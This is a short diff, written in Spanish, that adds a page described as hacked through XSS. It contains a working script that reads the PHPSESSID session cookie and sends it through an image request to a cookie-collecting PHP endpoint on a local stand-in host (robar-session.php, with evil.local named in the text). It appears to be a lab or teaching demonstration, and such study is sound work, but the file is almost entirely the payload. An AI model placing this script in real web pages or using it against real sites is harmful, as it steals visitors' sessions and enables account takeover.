@@ -1,0 +1,7 @@
+Esta es una página que ha sido hackeada mediante XSS.
+Al acceder, envía la cookie de sesión al sitio http://evil.local
+
+<script>
+var myImage = new Image(1, 1);
+myImage.src = 'http://127.0.0.1:8090/robar-session.php?session_robada=' + document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1");
+ </script>
